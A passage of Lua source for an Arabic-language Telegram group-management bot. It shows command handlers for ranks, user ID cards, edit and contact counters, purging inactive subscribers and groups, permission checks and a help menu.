send(msg.chat_id_, msg.id_,Text) 
end
if text == 'مسح تلكل' and BasicConstructor(msg) then  
database:del(bot_id..'Constructor'..msg.chat_id_)
database:del(bot_id..'Manager'..msg.chat_id_)
database:del(bot_id..'Mod:User'..msg.chat_id_)
database:del(bot_id..'Special:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◉ تم مسح تلكل ')
end
if text == 'تعطيل صيح' and Manager(msg) then  
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
database:set(bot_id..'Seh:User'..msg.chat_id_,true)  
Text = '\n ◉ تم تعطيل امر صيح'
else
Text = '\n ◉ بالتاكيد تم تعطيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل اطردني' and Manager(msg) then   
if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
Text = ' ◉ تم تفعيل امر اطردني إلى عايز يخرج يتنيل 😹'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = ' ◉ بالتاكيد تم تفعيل امر اطردني مخلاص كفايه تفعيل الأمر 😾'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل اطردني' and Manager(msg) then  
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
database:set(bot_id..'Cick:Me'..msg.chat_id_,true)  
Text = '\n ◉ تم تعطيل امر اطردني اترزع هن بقى مفيش خروج 😹'
else
Text = '\n ◉ بالتاكيد تم تعطيل امر اطردني مفيش خروج يولاد الكلب 😹'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == "نسبه جمالي" or text == "جمالي" then
if Sudo(msg) then
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," نسبه جمالك هي 500% \nعشان مطور وكدا لازم اطبله 😹♥\n" )
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
else
local function getpro(extra, result, success)
local nspp = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",}
local rdbhoto = nspp[math.random(#nspp)]
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," نسبه جمالك هي "..rdbhoto.."🙄♥" )
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
end

if text == "صورتي"  then
local my_ph = database:get(bot_id.."my_photo:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," ◉ الصوره معطله") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," ◉ عدد صورك ← "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end

if text == ("ايدي") and msg.reply_to_message_id_ == 0 and not database:get(bot_id..'Bot:Id'..msg.chat_id_) then     
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n ◉  يرجى الاشتراك بالقناه اولا \n ◉  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,sofi,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
elseif da.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end
local getbioY = getbio(msg.sender_user_id_)
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
local nummsggp = tonumber(msg.id_/2097152/0.5)
local nspatfa = tonumber(Msguser / nummsggp * 100)
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0)
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
local iduser = msg.sender_user_id_
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
local photps = (sofi.total_count_ or 0)
local interaction = Total_Msg(Msguser)
local rtpg = rtpa
local sofia = {
	
"يتي القمر نزل الارض يعمل اي🥺",

"صورتك عفنت غيرها بقي....🤓🧡",

"اي يعم القمر دا ملاك يجدعان...🥺💕",

"اي الصوره المفنه دي يعم....😜",

"هوا الي مجننا هوا هوا القمر هوا....😂",

"صورتك دي ولا صورت القمر.....🙈♥️",

}
local rdphoto = sofia[math.random(#sofia)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#bio',getbioY) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then   
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_, '\n     ꙰🦅 ليس لديك صور في حسابك \n['..get_id_text..']')      
end 
end
else
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n¦• 𝚄𝚂𝙴𝚁 ↬  ↝'..username..'↜  ◉\n¦• 𝙼𝚂𝙶𝚂↬  ↝'..Msguser..'↜  ◉\n¦• 𝚁𝙰𝙽𝙺↬ ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜  ◉\n¦• 𝙸𝙳↬   ↝'..msg.sender_user_id_..'↜ ◉\n¦• 𝙱𝙸𝙾 ↬ ↝'..getbioY..'↜ ◉\n ¦• 𝒄𝒉↬  ↝@so_alfaa ↜   ◉\n')
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n ¦✙ بيك عزيزي ↝'..Name..'↜ \n¦• 𝚄𝚂𝙴𝚁 ↬  ↝'..Name..'↜    ◉\n¦• 𝙼𝚂𝙶𝚂↬ ↝'..Msguser..'↜.   ◉\n ¦• 𝚁𝙰𝙽𝙺↬ ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜    ◉\n¦• 𝙸𝙳↬  ↝'..msg.sender_user_id_..'↜    ◉\n¦• 𝒄𝒉↬   ↝@so_alfaa ↜ ↝🇧??\n')
else
send(msg.chat_id_, msg.id_, '\n ◉ الصوره ⇜ ليس لديك صور في حسابك'..'[\n¦• 𝚄𝚂𝙴𝚁 ↬ ↝'..username..'↜\n¦• 𝙼𝚂𝙶𝚂↬ ↝'..Msguser..'↜\n¦• 𝙸𝙳↬  ↝'..msg.sender_user_id_..'↜\n¦• 𝒄𝒉↬  ↝@so_alfaa ↜\n')
end 
end
end
else
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#bio',getbioY) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_,'[\n¦• 𝚄𝚂𝙴𝚁 ↬  ↝'..username..'↜   ◉\n¦• 𝙼𝚂𝙶𝚂↬ ↝'..Msguser..'↜   ◉\n¦• 𝚁𝙰𝙽𝙺↬ ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜   ◉\n¦• 𝙸𝙳↬  ↝'..msg.sender_user_id_..'↜   ◉\n¦• 𝒄𝒉↬ ↝@so_alfaa ↜   ◉\n')
end
end

end,nil)
end,nil)
end,nil)
end,nil)
end
end
if text == ("Id") and msg.reply_to_message_id_ == 0 and not database:get(bot_id..'Bot:Id'..msg.chat_id_) then     
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,sofi,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
elseif da.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
local nummsggp = tonumber(msg.id_/2097152/0.5)
local nspatfa = tonumber(Msguser / nummsggp * 100)
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0)
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
local iduser = msg.sender_user_id_
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
local photps = (sofi.total_count_ or 0)
local interaction = Total_Msg(Msguser)
local rtpg = rtpa
local sofia = {
" ◉ قمر ياروحي خد ممح..💋❤️",
" ◉ صوتك عفنت غيرها بقي..💛",
" ◉ يتي القمر نزل الارض يعمل اي🥺",
" ◉ قلبي موجود فصوره .. 🥺❤️",
" ◉ الله ع جمالك ياقمري..🥺💛",
}
local rdphoto = sofia[math.random(#sofia)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then   
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_, '\n 🇧🇱 ليس لديك صور في حسابك \n['..get_id_text..']')      
end 
end
else
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n🇧🇱-𝒖𝒔𝒆𝒓   '..username..'\n 🇧🇱- 𝒎𝒔𝒈𝒔  '..Msguser..'\n 🇧🇱-𝒔𝒕𝒂𝒕𝒔  '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n 🇧🇱-𝒊𝒅 '..msg.sender_user_id_..'\n🇧🇱- 𝗖?? @so_alfaa \n')
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n◉ iD 𖦹 '..msg.sender_user_id_..'\n◉ User 𖦹 '..username..'\n◉ Rank 𖦹 '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n◉ Msg 𖦹 '..Msguser..' ') 
else
send(msg.chat_id_, msg.id_,'◉ ليس لديك صوره \n'..'\n◉ iD 𖦹 '..msg.sender_user_id_..'\n◉ User 𖦹 '..username..'\n◉ Rank 𖦹 '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n◉ Msg 𖦹 '..Msguser..' ') 
end 
end
end
else
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_,'[\n◉ iD 𖦹 '..msg.sender_user_id_..'\n◉ User 𖦹 '..username..'\n◉ Rank 𖦹 '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n◉ Msg 𖦹 '..Msguser..' ') 
end
end

end,nil)
end,nil)
end,nil)
end,nil)
end
end

if text == 'سحكاتي' or text == 'تعديلاتي' then 
local Num = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
if Num == 0 then 
Text = ' ◉  ليس لديك سحكات'
else
Text = ' ◉ عدد سحكاتك *← { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مسح سحكاتي" or text == "مسح سحكاتي" then  
send(msg.chat_id_, msg.id_,' ◉ تم مسح سحكاتك'  )  
database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
end
if text == "مسح جهاتي" or text == "مسح جهاتي" then  
send(msg.chat_id_, msg.id_,' ◉ تم مسح جهاتك'  )  
database:del(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_)
end
if text == 'جهاتي' or text == 'شكد ضفت' then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local Num = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
if Num == 0 then 
Text = ' ◉ لم تقم بأضافه احد'
else
Text = ' ◉ عدد جهاتك *← { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مسح المشتركين" and DevSoFi(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'- لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n- اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,' ◉  لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,' ◉ عدد المشتركين الان ← ( '..#pv..' )\n- تم ازالة ← ( '..sendok..' ) من المشتركين\n- الان عدد المشتركين الحقيقي ← ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "مسح الجروبات" and DevSoFi(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'- لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n- اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',group[i])  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=group[i],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,' ◉  لا يوجد جروبات وهميه في البوت\n')   
else
local DRAGON = (w + q)
local sendok = #group - DRAGON
if q == 0 then
DRAGON = ''
else
DRAGON = '\n- تم ازالة ← { '..q..' } جروبات من البوت'
end
if w == 0 then
DRAGONk = ''
else
DRAGONk = '\n- تم ازالة ← {'..w..'} جروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,' ◉ عدد الجروبات الان ← { '..#group..' }'..DRAGONk..''..DRAGON..'\n*- الان عدد الجروبات الحقيقي ← { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
return false
end

if text and text:match("^(gpinfo)$") or text and text:match("^معلومات الجروب$") then
function gpinfo(arg,data)
-- vardump(data) 
DRAGONdx(msg.chat_id_, msg.id_, ' ◉ ايدي المجموعة ← ( '..msg.chat_id_..' )\n ◉ عدد الادمنيه ← ( *'..data.administrator_count_..' )*\n ◉ عدد المحظورين ← ( *'..data.kicked_count_..' )*\n ◉ عدد الاعضاء ← ( *'..data.member_count_..' )*\n', 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end
-----------
if text ==("مسح") and Mod(msg) and tonumber(msg.reply_to_message_id_) > 0 then
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
end   
if database:get(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'id:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, " ◉ تم الغاء الامر ") 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'id:user'..msg.chat_id_)  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..iduserr,numadded)  
send(msg.chat_id_, msg.id_," ◉ تم اضافة له {"..numadded..'} من الرسائل')  
end
------------------------------------------------------------------------
if database:get(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'idgem:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, " ◉ تم الغاء الامر ") 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'idgem:user'..msg.chat_id_)  
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_, msg.id_,  1, "◉| تم اضافة له {"..numadded..'} من النقود', 1 , 'md')  
end
------------------------------------------------------------------------
if text == 'فحص البوتت' and Manager(msg) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = '✔️' else info = 'x' end
if Json_Info.result.can_delete_messages == true then
delete = '✔️' else delete = 'x' end
if Json_Info.result.can_invite_users == true then
invite = '✔️' else invite = 'x' end
if Json_Info.result.can_pin_messages == true then
pin = '✔️' else pin = 'x' end
if Json_Info.result.can_restrict_members == true then
restrict = '✔️' else restrict = 'x' end
if Json_Info.result.can_promote_members == true then
promote = '✔️' else promote = 'x' end 
send(msg.chat_id_,msg.id_,'\n ◉ اهلا عزيزي البوت هنا ادمن'..'\n ◉ وصلاحياته هي ↓ \n━━━━━━━━━━'..'\n ◉ تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n ◉ مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n ◉ حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n ◉ دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n ◉ تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n ◉ اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end

if text and text:match("^(.*)$") then
if database:get(bot_id..'help'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' ◉ تم حفظ الكليشه')
database:del(bot_id..'help'..msg.sender_user_id_)
database:set(bot_id..'help_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help1'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' ◉ تم حفظ الكليشه')
database:del(bot_id..'help1'..msg.sender_user_id_)
database:set(bot_id..'help1_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help2'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' ◉ تم حفظ الكليشه')
database:del(bot_id..'help2'..msg.sender_user_id_)
database:set(bot_id..'help2_text',text)
return false
end
end

if text and text:match("^(.*)$") then
if database:get(bot_id..'help3'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' ◉ تم حفظ الكليشه')
database:del(bot_id..'help3'..msg.sender_user_id_)
database:set(bot_id..'help3_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help4'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' ◉ تم حفظ الكليشه')
database:del(bot_id..'help4'..msg.sender_user_id_)
database:set(bot_id..'help4_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help5'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' ◉ تم حفظ الكليشه')
database:del(bot_id..'help5'..msg.sender_user_id_)
database:set(bot_id..'help5_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help6'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' ◉ تم حفظ الكليشه')
database:del(bot_id..'help6'..msg.sender_user_id_)
database:set(bot_id..'help6_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help7'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' ◉ تم حفظ الكليشه')
database:del(bot_id..'help7'..msg.sender_user_id_)
database:set(bot_id..'help7_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help8'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' ◉ تم حفظ الكليشه')
database:del(bot_id..'help8'..msg.sender_user_id_)
database:set(bot_id..'help8_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help9'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' ◉ تم حفظ الكليشه')
database:del(bot_id..'help9'..msg.sender_user_id_)
database:set(bot_id..'help9_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help10'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, ' ◉ تم حفظ الكليشه')
database:del(bot_id..'help10'..msg.sender_user_id_)
database:set(bot_id..'help10_text',text)
return false
end
end
---------------------- الاوامر الجديدة
if text == 'الاوامر' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'◉ ليس لديك رتبه لاستخدام هذه الاوامر 🙂')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa   = database:get(bot_id..'text:ch:user')
if so_alfaa   then
send(msg.chat_id_, msg.id_,'['..so_alfaa  ..']')
else
send(msg.chat_id_, msg.id_,'◉لا تستطيع استخدام البوت \n ◉يرجى الاشتراك بالقناه اولا \n ◉اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local Text =[[
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ قم بأختيار اللغه.. ↑↓
◉ Choose language.. ↑↓ 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀 ](t.me/so_alfaa  )
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'english 𝅘𝅥𝅮', callback_data="/add"},{text = 'عربي 𝅘𝅥𝅮', callback_data="/help90"},
},
{
{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ', url="t.me/so_alfaa  "},
},
{
{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
----------------------------------------------------------------------------
----------------------------------------------------------------- انتهئ الاوامر الجديدة
if text == "تعطيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_, '℘︙ تم تعطيل الزخرفه')
database:set(bot_id.." sofi:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'℘︙ تم تفعيل الزخرفه')
